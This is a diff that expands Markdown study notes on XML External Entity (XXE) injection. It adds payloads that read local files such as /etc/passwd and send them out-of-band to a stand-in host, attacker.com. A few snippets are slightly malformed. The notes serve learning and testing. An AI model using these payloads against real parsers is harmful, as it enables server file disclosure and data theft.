@@ -61,11 +61,15 @@ E.g. creating an entity whose value is another entity
     <hello>&#x3C;</hello>
     ```
 
+## Exploitations
+
 Entities can
 
 * store values we specify
 * pull values from a local files
 * fetch remote data over the network and store them as entities
+
+Here is an example of extracting contents from local files:
 
 ``` xml
 <?xml version="1.0"?>
@@ -81,9 +85,55 @@ There are different types of XXE's; inband, error, out-of-band (OOB)
 
 * inband - the XML will be parsed and the output will be shown on the screen
 * error - a blink XXE, where you basically see a bunch of errors
-* OOB - xml is parsed, but you can't see the output
+* OOB - xml is parsed, but you can't see the output. You would need to do some sort of out of band request to exfiltrate data.
 
-## External Document Type Definitions
+    ``` xml
+    <?xml version="1.0"?>
+    <!DOCTYPE XXE [
+    <!ENTITY SYSTEM "http://attacker.com:1337">
+    ]>
+    <data>&send;</data>
+    ```
+
+    If we can see the request to `http://attacker.com/1337` we know we can use an external entities
+
+### External Document Type Definitions
+
+Notice that DTDs aren't actually part of the XML data and are declared outside of it. DTDs can be loaded externally just like entities
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE Pwn [
+<!ENTITY % parameter_entity "<!ENTITY general_entity 'PwnFunction'">
+%parameter_entity;
+]>
+<pwn>&general_entity;</pwn>
+
+<!-- This is parsed and interpreted as -->
+<?xml version="1.0"?>
+<!DOCTYPE Pwn [
+<!ENTITY % parameter_entity "<!ENTITY general_entity 'PwnFunction'>">
+<!ENTITY general_entity 'PwnFunction'>
+]>
+<pwn>&general_entity;</pwn>
+```
+
+We can't use parameter entities within the markup declaration, but we can use it in the same level as the markup definition. So in the XML snippet below:
+
+* we **CAN'T** use `passwd` parameter in the wrapper parameter
+* we **CAN** use the `wrapper` parameter
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE XXE [
+<!ENTITY % passwd SYSTEM "/etc/passwd">
+<!ENTITY % wrapper SYSTEM "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
+<!ENTITY send SYSTEM 'http://attacker.com/?CONTENTS_OF_PASSWD'>
+]>
+<pwn>&send;</pwn>
+```
+
+Instead, we would have to use external DTDs
 
 ``` xml
 <!-- main.xml -->
